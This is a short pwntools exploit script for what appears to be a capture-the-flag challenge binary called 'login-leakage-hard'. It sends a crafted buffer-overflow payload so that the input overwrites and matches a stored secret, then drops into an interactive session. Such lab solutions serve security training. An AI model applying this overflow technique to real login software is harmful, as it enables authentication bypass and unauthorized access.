#!/usr/bin/python3

from pwn import *
import time

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/login-leakage-hard')

input_start  = 0x3d0
secret_addr = 0x3d0 - 0x3bd
overflow_size = input_start - secret_addr 

io = process()

payload = b"aaaaaaaa"+b"\x00"+cyclic(overflow_size - 9) + b"aaaaaaaa\x00"

io.sendline(str(len(payload)).encode())
time.sleep(1)
io.send(payload)

io.interactive()
